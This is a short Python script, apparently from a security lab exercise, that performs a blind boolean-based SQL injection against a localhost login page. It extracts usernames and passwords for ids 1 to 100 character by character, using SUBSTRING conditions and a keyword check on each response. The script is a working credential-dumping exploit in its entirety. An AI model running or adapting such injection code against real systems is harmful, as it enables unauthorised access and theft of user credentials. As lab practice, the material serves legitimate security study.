#!/usr/bin/env python3
import requests

url = 'http://localhost/lab09/login.php'
chars = 'abcdefghijklmnopqrstuvwxyz0123456789\'\"!@#$%^&*()_-=;:~`ABCDEFGHIJKLMNOPQRSTUWXYZ'
keyword = 'cat.JPG'
usernames = []
passwords = []

for i in range (1, 101):
    j = 1
    is_successful = True
    success_query = ''
    while is_successful:
        is_successful = False
        for letter in chars:
            injection = "?u=\" OR id = " + str(i) + " and SUBSTRING(username, " + str(j) + ", 1) = \'" + letter + "\' -- "
            req_content = requests.get(url+injection).text
            if req_content.find(keyword) != -1:
                success_query += letter
                is_successful = True
                j += 1
                break        
    usernames.append(success_query)


for i in range (1, 101):
    j = 1
    is_successful = True
    success_query = ''
    while is_successful:
        is_successful = False
        for letter in chars:
            injection = "?u=\" OR id = " + str(i) + " and SUBSTRING(password, " + str(j) + ", 1) = \'" + letter + "\' -- "
            req_content = requests.get(url+injection).text
            if req_content.find(keyword) != -1:
                success_query += letter
                is_successful = True
                j += 1
                break        
    passwords.append(success_query)


for i in range (0, 100):
    print('id:', i+1, 'username:', usernames[i], 'password:', passwords[i])
